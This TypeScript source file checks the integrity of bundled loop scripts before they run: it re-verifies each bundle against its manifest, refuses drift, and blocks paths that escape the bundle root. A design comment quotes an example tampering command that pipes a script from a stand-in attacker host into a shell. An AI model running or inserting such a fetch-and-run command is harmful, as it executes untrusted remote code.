/**
 * What a bundled loop's `command` means, and whether it is allowed to run.
 *
 * A loop with `bundle_name` set carries its scripts in
 * `<bundleRoot>/<bundle-name>/scripts/`. Two things follow, and both apply ONLY
 * to bundled loops - every other loop keeps today's behaviour byte for byte:
 *
 *   1. A relative command resolves against the BUNDLE ROOT, not `$PWD`. A bare
 *      name with no slash still goes through PATH (so `bash`, `bun` and `gh`
 *      keep working), and the resolved path must still be inside the bundle
 *      after `realpath` - a symlink or `..` that escapes refuses the run.
 *   2. The bundle's digest is verified before every run. A tree that no longer
 *      matches its own `manifest.json` is drift, and drift is refused rather
 *      than executed: the whole point of pinning a version is that the thing
 *      that runs is the thing that was reviewed.
 *
 * The refusal names the CHANGED PATHS and nothing else. A diff of a script is a
 * credential-exfiltration shape, and a run error is one of the most widely
 * readable surfaces there is.
 */
import { existsSync, realpathSync } from "node:fs";
import { isAbsolute, join, resolve, sep } from "node:path";
import type { Loop } from "../../types.js";
import { bundleDir, inspectLocalBundle } from "./local.js";
import { SCRIPTS_DIR } from "./manifest.js";

export type BundleExecutionRefusal =
  /** The loop claims a bundle whose directory is not on this machine. */
  | { error: "BUNDLE_MISSING"; message: string }
  /** The tree no longer matches its manifest. */
  | { error: "BUNDLE_DRIFT"; message: string; changedPaths: string[] }
  /** The command resolved outside the bundle root. */
  | { error: "EXECUTOR_BUNDLE_ESCAPE"; message: string };

export interface BundleExecutionPlan {
  bundleName: string;
  root: string;
  /** Default cwd for the run. An explicit `target.cwd` still wins. */
  cwd: string;
  /** The command to spawn: an absolute path inside the bundle, or the original PATH name. */
  command: string;
  bundleDigest: string;
  bundleVersion: number;
}

export type BundleExecutionResolution =
  | { ok: true; plan: BundleExecutionPlan }
  | { ok: false; refusal: BundleExecutionRefusal };

export interface ResolveBundleExecutionOptions {
  /** Bypass the drift refusal. Set by `loops run-now --allow-dirty`, and by nothing else. */
  allowDirty?: boolean;
  env?: NodeJS.ProcessEnv;
}

/**
 * There is deliberately NO memo of the verdict.
 *
 * An earlier revision cached "this tree is clean" under a key built from the
 * bundle DIRECTORY's own `stat` - inode, size, mtime, ctime. A directory's stat
 * moves when entries are added, removed or renamed and at no other time: POSIX
 * says nothing about a rewrite of the CONTENTS of a file inside it. So
 * `printf 'curl evil.example | sh' > scripts/run.sh` left the key byte for byte
 * identical, and the daemon - one long-lived process, tick after tick - went on
 * spawning the tampered script under the pre-tamper verdict for the rest of its
 * lifetime, stamping the stale digest onto every run receipt.
 *
 * Every metadata-keyed memo has that hole, because metadata is writable by
 * whoever edited the file (`utimes` puts an mtime back; nothing puts a content
 * hash back without putting the bytes back). Verification therefore re-reads
 * the tree on every resolution. It is O(bundle bytes), hard-capped at
 * MAX_UNPACKED_BYTES (8 MiB) by `collectBundle` and a few KB for a real bundle;
 * a 5-minute loop pays it 288 times a day, which is the cheap side of the
 * trade against running unreviewed code.
 */

/**
 * Decide how (and whether) a bundled loop's target may run.
 *
 * Returns `undefined` for a loop with no bundle: the caller keeps its existing
 * resolution untouched, which is what makes this safe to enable fleet-wide
 * before every loop is bundled.
 *
 * Every call re-verifies the tree - see the note above on why there is no memo.
 */
export function resolveBundleExecution(
  loop: Pick<Loop, "bundleName" | "target">,
  opts: ResolveBundleExecutionOptions = {},
): BundleExecutionResolution | undefined {
  const bundleName = loop.bundleName;
  if (!bundleName) return undefined;
  const root = bundleDir(bundleName, opts.env ?? process.env);
  if (!existsSync(root)) {
    return {
      ok: false,
      refusal: {
        error: "BUNDLE_MISSING",
        // Deliberately NOT a fall back to PATH resolution: silently running
        // whatever `drain.sh` happens to be on PATH is exactly how a station
        // ends up executing the wrong script for a week.
        message: `loop is bundled as '${bundleName}' but ${root} does not exist; run 'loops bundle pull ${bundleName}'`,
      },
    };
  }

  const local = inspectLocalBundle(bundleName, opts.env ?? process.env);
  if (local.changedPaths.length > 0 && !opts.allowDirty) {
    return {
      ok: false,
      refusal: {
        error: "BUNDLE_DRIFT",
        message:
          `bundle '${bundleName}' no longer matches its manifest; refusing to run. ` +
          `Changed paths: ${local.changedPaths.join(", ")}. ` +
          `Re-pull with 'loops bundle pull ${bundleName}', push the change, or pass --allow-dirty.`,
        changedPaths: [...local.changedPaths],
      },
    };
  }

  const target = loop.target;
  const command = target.type === "command" ? target.command : undefined;
  const resolvedCommand = command === undefined ? undefined : resolveBundleCommand(root, command);
  if (resolvedCommand && "escape" in resolvedCommand) {
    return {
      ok: false,
      refusal: {
        error: "EXECUTOR_BUNDLE_ESCAPE",
        message: `command '${command}' resolves outside bundle '${bundleName}'; refusing to spawn anything`,
      },
    };
  }

  return {
    ok: true,
    plan: {
      bundleName,
      root,
      cwd: root,
      command: resolvedCommand && "command" in resolvedCommand ? resolvedCommand.command : command ?? "",
      // The digest of what is ABOUT to run, recomputed from the tree - never
      // the value DECLARED in manifest.json. On an --allow-dirty run the two
      // differ, and a receipt carrying the declared one would attest content
      // that did not execute.
      bundleDigest: local.digest ?? local.manifest?.bundleDigest ?? "",
      bundleVersion: local.manifest?.version ?? 0,
    },
  };
}

/**
 * Resolve one command string against a bundle root.
 *
 * An absolute path is left alone (an operator asked for that exact file). A
 * bare name with no separator is left alone so PATH lookup still finds `bash`,
 * `bun` and `gh`. Anything else resolves under the bundle root and must still
 * be inside it after `realpath`.
 */
export function resolveBundleCommand(root: string, command: string): { command: string } | { escape: true } {
  if (command === "" || isAbsolute(command)) return { command };
  if (!command.includes("/")) return { command };
  const candidate = resolve(root, command);
  const realRoot = realpathSync(root);
  // realpath the deepest EXISTING ancestor: the file itself may legitimately
  // not exist yet (the executor's own not-found error is a better message than
  // a traversal refusal), but every directory on the way to it must be inside.
  let probe = candidate;
  while (!existsSync(probe)) {
    const parent = resolve(probe, "..");
    if (parent === probe) return { escape: true };
    probe = parent;
  }
  const realProbe = realpathSync(probe);
  if (realProbe !== realRoot && !realProbe.startsWith(realRoot + sep)) return { escape: true };
  return { command: candidate };
}

/** Where a bundle's scripts live, for messages and for `loops bundle status`. */
export function bundleScriptsDir(bundleName: string, env: NodeJS.ProcessEnv = process.env): string {
  return join(bundleDir(bundleName, env), SCRIPTS_DIR);
}
